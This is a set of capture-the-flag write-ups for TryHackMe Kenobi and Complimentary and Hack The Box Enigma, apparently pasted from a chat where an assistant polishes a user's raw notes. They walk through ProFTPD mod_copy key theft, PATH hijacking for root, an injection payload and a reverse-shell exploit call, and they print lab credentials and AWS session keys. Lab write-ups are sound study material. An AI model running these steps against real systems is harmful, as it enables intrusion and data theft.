# TryHackMe - Kenobi Writeup

> **Platform:** TryHackMe
> **Challenge:** Kenobi
> **Category:** Linux | SMB | NFS | FTP | Privilege Escalation

---

# Overview

Today we are solving another easy-rated Linux machine from TryHackMe named **Kenobi**.

This room demonstrates how multiple low-severity misconfigurations can be chained together to achieve complete system compromise. Instead of exploiting a single critical vulnerability, the attack combines information disclosure, an FTP module weakness, exposed NFS shares, and an insecure SUID binary to gain root access.

---

# Target Information

**Target IP**

```text
10.49.128.90
```

---

# Initial Reconnaissance

The first step is performing a full TCP port scan.

```bash
nmap -p- 10.49.128.90
```

The scan reveals several interesting services:

* FTP
* SSH
* HTTP
* RPC
* SMB
* NFS

Although additional high-numbered ports are open, they are associated with RPC services and are not the primary focus during the initial enumeration.

---

# Service Enumeration

A service and version detection scan is performed.

```bash
nmap -sC -sV 10.49.128.90
```

Important discoveries include:

* ProFTPD 1.3.5
* Samba 4.6.2
* Apache 2.4.41
* NFS Export
* robots.txt containing `/admin.html`

One service immediately stands out:

```text
ProFTPD 1.3.5
```

This version is known to contain vulnerabilities involving the **mod_copy** module.

Rather than attacking it immediately, additional enumeration is performed to gather more context.

---

# SMB Enumeration

Anonymous SMB enumeration is performed.

Using enumeration tools reveals local users such as:

```text
kenobi

ubuntu

nobody
```

Listing available shares identifies an anonymous share.

```text
anonymous
```

Connecting without authentication:

```bash
smbclient //10.49.128.90/anonymous -N
```

reveals a file named:

```text
log.txt
```

Reviewing the log file provides useful information regarding the FTP service and its directory structure.

This confirms that the FTP service is operating under the **kenobi** user account.

---

# NFS Enumeration

Since both RPC and NFS are available, exported directories are checked.

```bash
showmount -e 10.49.128.90
```

Output:

```text
/var
```

At this stage the share is noted, but not mounted yet because another vulnerability must first be leveraged.

---

# Investigating ProFTPD

Searching for public vulnerabilities affecting **ProFTPD 1.3.5** reveals the well-known **mod_copy** vulnerability.

The vulnerable module supports the following FTP commands:

* SITE CPFR
* SITE CPTO

These commands allow files to be copied on the server without authentication.

Rather than using an automated exploit, the vulnerability is exploited manually.

The private SSH key belonging to **kenobi** is copied from its original location into a writable directory.

```text
/home/kenobi/.ssh/id_rsa

↓

/var/tmp/id_rsa
```

The FTP server reports:

```text
Copy successful
```

At this point, the SSH key exists inside the exported NFS directory.

---

# Mounting the NFS Share

Now the exported directory is mounted locally.

```bash
mount -t nfs 10.49.128.90:/var ./kennfs
```

Browsing the mounted filesystem reveals:

```text
/tmp/id_rsa
```

The SSH private key is copied to the attack machine.

After assigning appropriate permissions:

```bash
chmod 600 id_rsa
```

the key is used for SSH authentication.

Successful login provides access as:

```text
kenobi
```

---

# User Flag

Inside Kenobi's home directory the user flag is located.

```text
d0b0f3f53b6caa532a83915e19224899
```

---

# Privilege Escalation Enumeration

After obtaining a shell, standard privilege escalation enumeration begins.

Searching for SUID binaries reveals an unusual executable.

```text
/usr/bin/menu
```

Unlike common SUID binaries, this appears to be a custom application.

Inspecting it with `strings` reveals that it executes several system commands.

Among them:

```text
curl

uname

ifconfig
```

One important observation is that the program references **curl** without using its absolute path.

This creates an opportunity for **PATH hijacking**.

---

# Exploiting PATH Hijacking

A malicious executable named `curl` is created.

Instead of performing an HTTP request, it launches a shell.

```bash
echo /bin/sh > curl
chmod +x curl
```

The current directory is then placed at the beginning of the PATH variable.

```bash
export PATH=/tmp:$PATH
```

When `/usr/bin/menu` is executed and the first menu option is selected, the program attempts to run `curl`.

Because the shell searches the modified PATH first, it executes the attacker's fake binary instead.

The result is a root shell.

---

# Root Flag

With root privileges obtained, the final flag is retrieved.

```text
177b3cd8562289f37382721c28381f02
```

---

# Attack Flow

```text
Nmap Scan
        │
        ▼
Enumerate SMB
        │
        ▼
Read FTP Log File
        │
        ▼
Identify ProFTPD Version
        │
        ▼
Exploit mod_copy
        │
        ▼
Copy SSH Private Key
        │
        ▼
Mount NFS Share
        │
        ▼
Retrieve id_rsa
        │
        ▼
SSH as Kenobi
        │
        ▼
Enumerate SUID Binaries
        │
        ▼
Analyze menu Binary
        │
        ▼
PATH Hijacking
        │
        ▼
Root Shell
```

---

# Vulnerabilities Identified

* Anonymous SMB share exposing internal logs
* Vulnerable ProFTPD 1.3.5 (mod_copy)
* Exposed NFS export
* Insecure storage of SSH private key
* PATH hijacking in a SUID binary
* Improper use of relative command execution

---

# Key Takeaways

Kenobi is an excellent example of how multiple moderate-risk issues can be chained together into a complete system compromise. Anonymous SMB access exposed internal information that guided further enumeration, while the vulnerable ProFTPD `mod_copy` feature allowed an attacker to copy sensitive files without authentication.

The exported NFS share unintentionally provided access to the copied SSH key, enabling authenticated access as a legitimate user. Finally, a custom SUID binary executed system commands using the PATH environment variable instead of absolute paths, making it vulnerable to PATH hijacking and resulting in root access.

This machine reinforces the importance of securing exposed services, avoiding unnecessary file shares, restricting access to sensitive credentials, and always invoking privileged system commands using absolute paths.


# Jai SHRI RAM - RAW WRITEUP





Yesterday 11:41 PM

Pasted text(203).txt
Document
same for this but this is different one

Today 8:20 AM

Pasted text(204).txt
Document
same for this but this is different

Here's a polished GitHub-style writeup for Hack The Box - Enigma, matching the style of your previous reports. It's based on the methodology you followed and is grounded in the notes you shared. 


Hack The Box - Enigma Writeup
Platform: Hack The Box
Machine: Enigma
Category: Linux | NFS | Email Enumeration | Web Exploitation | Command Injection

Overview
Enigma is a Linux machine that combines several real-world attack vectors into a complete compromise. The machine requires pivoting through multiple services including NFS, POP3/IMAP, and a vulnerable web application before ending with a command injection vulnerability that results in root access.

Rather than relying on a single exploit, the machine rewards careful enumeration and chaining together information gathered from different services.

Target Information
Target IP

10.129.6.179
Initial Reconnaissance
The first step is performing a full TCP port scan.

nmap -p- 10.129.6.179
Several interesting services are exposed:

SSH

HTTP

POP3 / POP3S

IMAP / IMAPS

RPC

NFS

The presence of RPC and NFS immediately suggests checking for exported network shares.

NFS Enumeration
RPC information confirms that NFS is available.

Listing exported shares:

showmount -e 10.129.6.179
Output:

/srv/nfs/onboarding
The share is mounted locally.

mount -t nfs 10.129.6.179:/srv/nfs/onboarding ./onboard
Inside the share is an onboarding PDF intended for new employees.

The document contains the first set of credentials.

Username: kevin

Password: Enigma2024!
It also reveals a new internal host.

mail001.enigma.htb
At this point, /etc/hosts is updated so the hostname resolves correctly.

Mail Enumeration
Instead of attacking the web server immediately, the discovered credentials are tested against the available mail services.

Connecting securely to POP3:

openssl s_client -connect 10.129.6.179:995
Authentication succeeds.

Listing the mailbox reveals an onboarding email from Sarah.

The email contains useful information about the company's internal infrastructure but no additional credentials.

Testing IMAPS on port 993 confirms that the same credentials work successfully over the secure mail service.

Password Reuse
While reviewing the discovered usernames, an important observation is made.

Organizations frequently reuse passwords internally.

Testing:

Username: sarah

Password: Enigma2024!
is successful.

This grants access to Sarah's mailbox.

A second email contains another set of credentials.

URL:
http://support_001.enigma.htb

Username:
admin

Password:
Ne3s4rtars78s
Support Portal Enumeration
Logging into the support portal reveals an application running OpenSTAManager.

Version information identifies:

OpenSTAManager 2.9.8
Searching public vulnerability databases reveals a Remote Code Execution vulnerability affecting this version.

A public proof-of-concept is available.

Remote Code Execution
The exploit is first tested using a simple command.

id
Output:

uid=33(www-data)
Since command execution is confirmed, a reverse shell is generated.

python exploit.py \
--reverse-shell <ATTACKER_IP> 4444
A connection is received as:

www-data
The shell is then upgraded using Python PTY and terminal settings are adjusted to obtain a fully interactive shell.

Local Enumeration
During post-exploitation, the Roundcube configuration is inspected.

A configuration file reveals database credentials.

roundcube

Yo270x26!gTx02
Using the exposed credentials, the Roundcube database is dumped with mysqldump.

Searching the dump reveals local usernames, including haris.

After cracking the recovered password hash, valid credentials are obtained.

haris

bestfriends
This provides user-level access.

Discovering OliveTin
While enumerating the system, an interesting configuration is discovered under:

/opt
The configuration references OliveTin, an automation platform exposing administrative actions.

One configured action executes the following command:

mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }}
Since user-controlled input is inserted directly into a shell command, this immediately suggests a command injection vulnerability.

Command Injection
The OliveTin interface is only accessible locally.

http://127.0.0.1:1337
Supplying the following payload in the password field:

x'; id; #
results in:

mysqldump -u USER -p'x'; id; #
The injected command executes successfully.

Output:

uid=0(root)
This confirms that OliveTin executes commands as root.

Root Access
Instead of spawning another shell, an SSH public key is added to root's authorized_keys through the command injection vulnerability.

Once the key is written, SSH access as root is obtained directly.

The machine is now fully compromised.

Attack Flow
Nmap Scan
        │
        ▼
Enumerate NFS
        │
        ▼
Mount Onboarding Share
        │
        ▼
Recover Kevin Credentials
        │
        ▼
Access Mail Services
        │
        ▼
Read Internal Emails
        │
        ▼
Password Reuse
        │
        ▼
Access Support Portal
        │
        ▼
Exploit OpenSTAManager RCE
        │
        ▼
Reverse Shell
        │
        ▼
Local Enumeration
        │
        ▼
Recover Roundcube Credentials
        │
        ▼
Obtain Haris Access
        │
        ▼
Discover OliveTin
        │
        ▼
Exploit Command Injection
        │
        ▼
Write Root SSH Key
        │
        ▼
Root Access
Vulnerabilities Identified
Exposed NFS share

Sensitive onboarding documents publicly accessible

Password reuse across multiple accounts

OpenSTAManager Remote Code Execution

Plaintext credentials in configuration files

Command Injection in OliveTin

Root command execution through unsafe shell parameter handling

Key Takeaways
Enigma demonstrates how seemingly low-risk findings can combine into a full system compromise. An exposed NFS share leaked employee credentials, which enabled access to internal mail services. Those emails revealed additional administrative credentials, leading to a vulnerable support application and remote code execution.

Post-exploitation required careful enumeration rather than relying on automated privilege escalation tools. Configuration files exposed additional credentials, and the discovery of OliveTin revealed a command injection vulnerability that ultimately allowed commands to execute as root.

The machine highlights several common security issues found in real environments: exposed network shares, password reuse, insecure handling of sensitive configuration files, and unsafe construction of shell commands. Together, these weaknesses created a complete attack chain from initial access to full administrative control.


Today 8:00 PM
Today we are back with another Tryhackme challenge named complimentary which is cloud security based challenge.


Concierge Briefing

Lambo(Mia) installed the Byte Lotus Wellness app the day she arrived — it was free, it had great reviews (written by the app, but she didn't check), and it got her a tote bag for saying yes to camera, mic, contacts, and location access. No account needed. No login screen. It just… knows things about you the moment you open it.

That's the whole pitch: “complimentary” access, no friction, no sign-up. Something still has to be deciding what you're allowed to see, even without a login — and whatever that something is, it isn't checking very carefully.

Your objective: find out how the app knows anything about you at all, and see what else it's willing to hand over.

:~# aws s3 ls s3://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com --no-sign-request

aws: [ERROR]: An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist
root@ip-10-48-109-197:~# aws configure --profile byte-lotus
root@ip-10-48-109-197:~# aws configure --profile byte-lotus

Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.

AWS Access Key ID [None]: ASIAU2VYTBGYBJLRKKU4
AWS Secret Access Key [None]: QNxBDc1Z3bOdqTSpDwQkDQHe+4k+YwtLkX6mwjqh
AWS Session Token [None]: IQoJb3JpZ2luX2VjEMT//////////wEaCXVzLWVhc3QtMSJH<WdNLLvQCcAngVKcbMNMBXBH68VpT7Y06Qu9iKq0zU7YWm5+3yrvAW/qJGJg4Yoa       
Default region name [None]: us-east-1
Default output format [None]: 
root@ip-10-48-109-197:~# aws sts get-caller-identity --profile byte-lotus
{
    "UserId": "AROAU2VYTBGYCEB4JME2S:CognitoIdentityCredentials",
    "Account": "332173347248",
    "Arn": "arn:aws:sts::332173347248:assumed-role/complimentary-cognito-unauth-role/CognitoIdentityCredentials"
}
root@ip-10-48-109-197:~# aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --profile byte-lotus --region us-east-1
{
    "Items": [
        {
            "password": {
                "S": "digitaldetox2026"
            },
            "location": {
                "S": "25.2055,55.2733"
            },
            "notes": {
                "S": "Booked the quiet room for his \"digital detox.\" Checked email twice since writing that."

same for this but this is different

TryHackMe - Complimentary Writeup
Platform: TryHackMe
Challenge: Complimentary
Category: Cloud Security | AWS | Cognito | IAM Misconfiguration | DynamoDB

Overview
Today we are solving another cloud-focused challenge from TryHackMe named Complimentary.

Unlike traditional web exploitation rooms, this challenge focuses on AWS cloud security and demonstrates how misconfigured cloud permissions can expose sensitive data without requiring a user account.

The application advertises itself as requiring no registration or login, yet it somehow personalizes information for every visitor. The objective is to understand how the application identifies users and determine whether the backend exposes more information than intended.

Challenge Scenario
The challenge begins with a concierge briefing describing the Byte Lotus Wellness application.

The application promises instant access without requiring users to create an account, but still manages to recognize them and display personalized information.

This immediately raises an important security question:

If there is no authentication, what AWS service is deciding what an anonymous user is allowed to access?

Initial Enumeration
The first instinct is to inspect the application's S3 bucket.

Attempting to list the bucket anonymously:

aws s3 ls s3://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com \
--no-sign-request
returns:

NoSuchBucket
This indicates that either the bucket name is incorrect or the application isn't relying on public S3 access.

Rather than continuing to brute-force storage resources, the focus shifts toward the AWS credentials provided during the challenge.

Configuring AWS CLI
The provided temporary credentials are configured into a dedicated AWS CLI profile.

aws configure --profile byte-lotus
The following information is supplied:

AWS Access Key

Secret Access Key

Session Token

Region: us-east-1

Since temporary credentials are being used, the next step is verifying exactly who we are authenticated as.

Identity Enumeration
Using AWS STS:

aws sts get-caller-identity \
--profile byte-lotus
The response reveals:

Assumed Role

complimentary-cognito-unauth-role
This is the most important finding in the challenge.

Rather than authenticating as a real application user, the credentials belong to an unauthenticated Amazon Cognito Identity Pool role.

This means the application allows anonymous visitors to receive temporary AWS credentials.

Normally these roles should have extremely limited permissions.

Exploring Available Permissions
With valid AWS credentials available, the next step is determining what resources this role can access.

One of the first services tested is DynamoDB.

Running:

aws dynamodb scan \
--table-name complimentary-GuestWellnessProfiles \
--profile byte-lotus \
--region us-east-1
returns data successfully.

This immediately confirms that anonymous users possess permission to read the DynamoDB table.

Sensitive Information Disclosure
Scanning the table reveals multiple guest records.

One of the retrieved entries contains highly sensitive information, including:

Password:
digitaldetox2026

Location:
25.2055,55.2733

Notes:
Booked the quiet room for his "digital detox."
Checked email twice since writing that.
This demonstrates that the database stores far more information than should ever be accessible to anonymous users.

Rather than exposing only public profile data, the application leaks:

User passwords

Personal notes

Guest locations

Internal profile information

Why This Happened
The root cause of the vulnerability is an overly permissive IAM policy attached to the unauthenticated Cognito role.

The intended authentication flow was:

Visitor

↓

Temporary Cognito Identity

↓

Restricted AWS Permissions
Instead, the permissions effectively became:

Anonymous Visitor

↓

Temporary AWS Credentials

↓

Full DynamoDB Read Access
Because DynamoDB permissions were granted directly to unauthenticated identities, anyone capable of obtaining temporary credentials could enumerate the database without creating an account.

Attack Flow
Application Analysis
        │
        ▼
Identify AWS Backend
        │
        ▼
Configure Temporary Credentials
        │
        ▼
Verify Identity with STS
        │
        ▼
Discover Unauthenticated Cognito Role
        │
        ▼
Enumerate AWS Services
        │
        ▼
Access DynamoDB
        │
        ▼
Read Guest Profiles
        │
        ▼
Recover Sensitive Information
Vulnerabilities Identified
Overly permissive Amazon Cognito unauthenticated role

Excessive IAM permissions

Unrestricted DynamoDB table access

Exposure of plaintext sensitive information

Broken access control in cloud infrastructure

Insecure handling of guest data

Key Takeaways
This room highlights one of the most common cloud security mistakes: granting excessive permissions to unauthenticated identities. Amazon Cognito is designed to provide temporary AWS credentials to anonymous users when required, but those credentials must follow the principle of least privilege.

Because the associated IAM role was allowed to perform unrestricted DynamoDB scans, anonymous users could retrieve sensitive customer information without ever authenticating. The exposed data included passwords, locations, and private notes, illustrating the impact of misconfigured cloud permissions.

The challenge reinforces the importance of carefully reviewing IAM policies, restricting access to cloud resources, and ensuring that temporary credentials are limited to only the minimum permissions necessary for application functionality.


Today 9:02 PM

Pasted text(205).txt
Document
same for this but this is different one

Here's a polished GitHub-style writeup for TryHackMe - Kenobi, following the same style as your previous writeups while keeping it distinct and focused on methodology rather than just commands. It is based on the notes you provided. 


TryHackMe - Kenobi Writeup
Platform: TryHackMe
Challenge: Kenobi
Category: Linux | SMB | NFS | FTP | Privilege Escalation

Overview
Today we are solving another easy-rated Linux machine from TryHackMe named Kenobi.

This room demonstrates how multiple low-severity misconfigurations can be chained together to achieve complete system compromise. Instead of exploiting a single critical vulnerability, the attack combines information disclosure, an FTP module weakness, exposed NFS shares, and an insecure SUID binary to gain root access.

Target Information
Target IP

10.49.128.90
Initial Reconnaissance
The first step is performing a full TCP port scan.

nmap -p- 10.49.128.90
The scan reveals several interesting services:

FTP

SSH

HTTP

RPC

SMB

NFS

Although additional high-numbered ports are open, they are associated with RPC services and are not the primary focus during the initial enumeration.

Service Enumeration
A service and version detection scan is performed.

nmap -sC -sV 10.49.128.90
Important discoveries include:

ProFTPD 1.3.5

Samba 4.6.2

Apache 2.4.41

NFS Export

robots.txt containing /admin.html

One service immediately stands out:

ProFTPD 1.3.5
This version is known to contain vulnerabilities involving the mod_copy module.

Rather than attacking it immediately, additional enumeration is performed to gather more context.

SMB Enumeration
Anonymous SMB enumeration is performed.

Using enumeration tools reveals local users such as:

kenobi

ubuntu

nobody
Listing available shares identifies an anonymous share.

anonymous
Connecting without authentication:

smbclient //10.49.128.90/anonymous -N
reveals a file named:

log.txt
Reviewing the log file provides useful information regarding the FTP service and its directory structure.

This confirms that the FTP service is operating under the kenobi user account.

NFS Enumeration
Since both RPC and NFS are available, exported directories are checked.

showmount -e 10.49.128.90
Output:

/var
At this stage the share is noted, but not mounted yet because another vulnerability must first be leveraged.

Investigating ProFTPD
Searching for public vulnerabilities affecting ProFTPD 1.3.5 reveals the well-known mod_copy vulnerability.

The vulnerable module supports the following FTP commands:

SITE CPFR

SITE CPTO

These commands allow files to be copied on the server without authentication.

Rather than using an automated exploit, the vulnerability is exploited manually.

The private SSH key belonging to kenobi is copied from its original location into a writable directory.

/home/kenobi/.ssh/id_rsa

↓

/var/tmp/id_rsa
The FTP server reports:

Copy successful
At this point, the SSH key exists inside the exported NFS directory.

Mounting the NFS Share
Now the exported directory is mounted locally.

mount -t nfs 10.49.128.90:/var ./kennfs
Browsing the mounted filesystem reveals:

/tmp/id_rsa
The SSH private key is copied to the attack machine.

After assigning appropriate permissions:

chmod 600 id_rsa
the key is used for SSH authentication.

Successful login provides access as:

kenobi
User Flag
Inside Kenobi's home directory the user flag is located.

d0b0f3f53b6caa532a83915e19224899
Privilege Escalation Enumeration
After obtaining a shell, standard privilege escalation enumeration begins.

Searching for SUID binaries reveals an unusual executable.

/usr/bin/menu
Unlike common SUID binaries, this appears to be a custom application.

Inspecting it with strings reveals that it executes several system commands.

Among them:

curl

uname

ifconfig
One important observation is that the program references curl without using its absolute path.

This creates an opportunity for PATH hijacking.

Exploiting PATH Hijacking
A malicious executable named curl is created.

Instead of performing an HTTP request, it launches a shell.

echo /bin/sh > curl
chmod +x curl
The current directory is then placed at the beginning of the PATH variable.

export PATH=/tmp:$PATH
When /usr/bin/menu is executed and the first menu option is selected, the program attempts to run curl.

Because the shell searches the modified PATH first, it executes the attacker's fake binary instead.

The result is a root shell.

Root Flag
With root privileges obtained, the final flag is retrieved.

177b3cd8562289f37382721c28381f02
Attack Flow
Nmap Scan
        │
        ▼
Enumerate SMB
        │
        ▼
Read FTP Log File
        │
        ▼
Identify ProFTPD Version
        │
        ▼
Exploit mod_copy
        │
        ▼
Copy SSH Private Key
        │
        ▼
Mount NFS Share
        │
        ▼
Retrieve id_rsa
        │
        ▼
SSH as Kenobi
        │
        ▼
Enumerate SUID Binaries
        │
        ▼
Analyze menu Binary
        │
        ▼
PATH Hijacking
        │
        ▼
Root Shell
Vulnerabilities Identified
Anonymous SMB share exposing internal logs

Vulnerable ProFTPD 1.3.5 (mod_copy)

Exposed NFS export

Insecure storage of SSH private key

PATH hijacking in a SUID binary

Improper use of relative command execution

Key Takeaways
Kenobi is an excellent example of how multiple moderate-risk issues can be chained together into a complete system compromise. Anonymous SMB access exposed internal information that guided further enumeration, while the vulnerable ProFTPD mod_copy feature allowed an attacker to copy sensitive files without authentication.

The exported NFS share unintentionally provided access to the copied SSH key, enabling authenticated access as a legitimate user. Finally, a custom SUID binary executed system commands using the PATH environment variable instead of absolute paths, making it vulnerable to PATH hijacking and resulting in root access.

This machine reinforces the importance of securing exposed services, avoiding unnecessary file shares, restricting access to sensitive credentials, and always invoking privileged system commands using absolute paths.


Today we are back with another Tryhackme linux based challenge to solve named kenobi which is easy one.

We are given Main IP :: 10.49.128.90

Let's start with all port scan on the IP.

Nmap scan report for ip-10-49-128-90.ap-south-1.compute.internal (10.49.128.90)
Host is up (0.0012s latency).
Not shown: 65524 closed tcp ports (reset)
PORT STATE SERVICE
21/tcp open ftp
22/tcp open ssh
80/tcp open http
111/tcp open rpcbind
139/tcp open netbios-ssn
445/tcp open microsoft-ds
2049/tcp open nfs
32809/tcp open unknown
38067/tcp open unknown
44143/tcp open unknown
58231/tcp open unknown

So statistically we will not be exploiting the unknown open ports for now so we have 7 services running here.

Let's perform service and version detection scan here.

Nmap scan report for ip-10-49-128-90.ap-south-1.compute.internal (10.49.128.90)
Host is up, received reset ttl 64 (0.00033s latency).
Scanned at 2026-07-30 04:12:38 UTC for 12s

PORT STATE SERVICE REASON VERSION
21/tcp open ftp syn-ack ttl 64 ProFTPD 1.3.5
22/tcp open ssh syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 ef:b4:ec:37:fd:e3:ae:f0:c9:78:04:75:88:af:5a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDARzyyPlJsW7WJfVv+HwZijw2TOSGdYFR8v6/nNtiMYu7KAwITgiRbTYM1lmGCSbZIG7QYnBzrv61SRRpIk3NraOTStlThrrYyKhpN4ZPAFwaRq+NKNjGT+GSKLeXm7Fce+2Tsse/MiUYXze0H8RpBWd19A1xwjM+rRXqlDeLD0IueLT/LJ11ffHp6ZjlejtPDQODZz0YLeN6BGp1soKJmwFeVOxr/gm4m39y6X5XHUvne50nqsgdty1bgCTajdgY19XMhINS+qytf9XvbPK8r0SWsFh16vUDLRmqtAI9hJTXCmx1bPwNChnwv31mA7v1lVysfG+SHATt67oNrru682DYK2Kq02X/CbHLX6EqulMoqXkyqPvU7pgJm+4LRmJ3x61IHK4WO+re/cobDSInTBcTnLW4XJZlwtq0Ie+RfXRZCoi9BPxwRtPLPSLxK2PvBnlcCJfuCFQnml/jdsgo4MMent0Wf03bG/tgJnDh7kJPuLXEAUfFKkc3zbReT7v8=
| 256 f9:26:d8:63:71:19:b6:4a:f6:70:01:c0:c4:e8:66:62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFJH4W9n8Vc3Hk/BqR+mvVEfIOusqHDh6Aq9JFN1gnLJs5jJy1A8ujeYvy6TVJ1s0unotGNv7ah5T2PnTfGQKJY=
| 256 de:7f:4a:75:3c:b4:42:25:d1:6c:d2:c7:99:0f:ea (ED25519)
|ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ+f74zFUaMoxQXA8g5xHm4kTQLA2G4uMmKbmCHCrQ+Z
80/tcp open http syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
| Supported Methods: OPTIONS HEAD GET POST
| http-robots.txt: 1 disallowed entry
|_/admin.html
|_http-server-header: Apache/2.4.41 (Ubuntu)
|http-title: Site doesn't have a title (text/html).
111/tcp open rpcbind syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo:
| program version port/proto service
| 100000 2,3,4 111/tcp rpcbind
| 100000 2,3,4 111/udp rpcbind
| 100000 3,4 111/tcp6 rpcbind
| 100000 3,4 111/udp6 rpcbind
| 100003 3 2049/udp nfs
| 100003 3 2049/udp6 nfs
| 100003 3,4 2049/tcp nfs
| 100003 3,4 2049/tcp6 nfs
| 100005 1,2,3 32809/tcp mountd
| 100005 1,2,3 34012/udp mountd
| 100005 1,2,3 39563/udp6 mountd
| 100005 1,2,3 48949/tcp6 mountd
| 100021 1,3,4 35013/tcp6 nlockmgr
| 100021 1,3,4 36998/udp6 nlockmgr
| 100021 1,3,4 39515/udp nlockmgr
| 100021 1,3,4 44143/tcp nlockmgr
| 100227 3 2049/tcp nfs_acl
| 100227 3 2049/tcp6 nfs_acl
| 100227 3 2049/udp nfs_acl
| 100227 3 2049/udp6 nfs_acl
139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
2049/tcp open nfs syn-ack ttl 64 3-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux

Host script results:
| smb2-security-mode:
| 3:1:1:
|_ Message signing enabled but not required
| smb2-time:
| date: 2026-07-30T04:12:49
|_ start_date: N/A
| p2p-conficker:
| Checking for Conficker.C or higher...
| Check 1 (port 17018/tcp): CLEAN (Couldn't connect)
| Check 2 (port 65211/tcp): CLEAN (Couldn't connect)
| Check 3 (port 33127/udp): CLEAN (Failed to receive data)
| Check 4 (port 55294/udp): CLEAN (Failed to receive data)
|_ 0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
| KENOBI<00> Flags: <unique><active>
| KENOBI<03> Flags: <unique><active>
| KENOBI<20> Flags: <unique><active>
| \x01\x02__MSBROWSE__\x02<01> Flags: <group><active>
| WORKGROUP<00> Flags: <group><active>
| WORKGROUP<1d> Flags: <unique><active>
| WORKGROUP<1e> Flags: <group><active>
| Statistics:
| 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
| 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_ 00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: -1s

So we have this all services on the backend so let's start with enumeration even 2049 port is also open let's start with it.

Or we can come with the row too so let's start with port 111 as rpc we will use rpcclient here.

rpcinfo 10.49.128.90
program version netid address service owner
100000 4 tcp6 ::.0.111 portmapper superuser
100000 3 tcp6 ::.0.111 portmapper superuser
100000 4 udp6 ::.0.111 portmapper superuser
100000 3 udp6 ::.0.111 portmapper superuser
100000 4 tcp 0.0.0.0.0.111 portmapper superuser
100000 3 tcp 0.0.0.0.0.111 portmapper superuser
100000 2 tcp 0.0.0.0.0.111 portmapper superuser

So it was showing this much only and more

let's now start with smb samba share exploitations.

[+] Enumerating users using SID S-1-5-21-55073928-793008161-2116500600 and logon username '', password ''

S-1-5-21-55073928-793008161-2116500600-501 KENOBI\nobody (Local User)
S-1-5-21-55073928-793008161-2116500600-513 KENOBI\None (Domain Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\kenobi (Local User)
S-1-22-1-1001 Unix User\ubuntu (Local User)

So we got this all and we will dive deeper into this exploitation.

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    anonymous       Disk      
    IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
Let's dive with this.

So after seeing the list we will connect to the particular port and share using smbclient

smbclient \\10.49.128.90\anonymous -N
Try "help" to get a list of possible commands.
smb: >

And then we get log.txt here.

And in this file we can see the logs for proftpd here which will help us get more understanding about the backend structure.

Also one of the answer for thm question showmount -e 10.49.128.90
Export list for 10.49.128.90:
/var *

continuing with our exploitation.

Also from the service scan of nmap we came to know about the ProFTPD version which is vulnerable to some command injection.

We can get it on the msfconsole.

msf > search proftpd 1.3.5

Matching Modules
Name Disclosure Date Rank Check Description
0 exploit/unix/ftp/proftpd_modcopy_exec 2015-04-22 excellent Yes ProFTPD 1.3.5 Mod_Copy Command Execution

Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/proftpd_modcopy_exec

msf > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf exploit(unix/ftp/proftpd_modcopy_exec) >

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user

So the exploit won't be working directly

nc 10.49.128.90 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.49.128.90]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

so we did the manual exploitation for now.

But this file still needed for the password so let's connect to final port we didn't exploited yet which is 2049 NFS

root㉿kali)-[/var/tmp]
└─# mount -t nfs 10.49.128.90:/var /home/kali/thm/kenobi/kennfs

ls
backups crash local log opt snap tmp
cache lib lock mail run spool www

┌──(root㉿kali)-[/home/kali/thm/kenobi/kennfs]
└─# cp /home/kali/thm/kenobi/kennfs/tmp/id_rsa /home/kali/thm/kenobi

┌──(root㉿kali)-[/home/kali/thm/kenobi/kennfs]
└─# cd ..

And this is how we have

kenobi@kenobi:~$ ls
share user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899

TIME FOR PRIVILEGE ESCALATION ::

/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/su
kenobi@kenobi:~$
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null

and /usr/bin/menu is unwanted here.

Using strings on menu utility we get 1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig

which is different one.

And this is how we can exploit the particular utility

echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

status check

kernel version

ifconfig
** Enter your choice :1

cat /root/root.txt
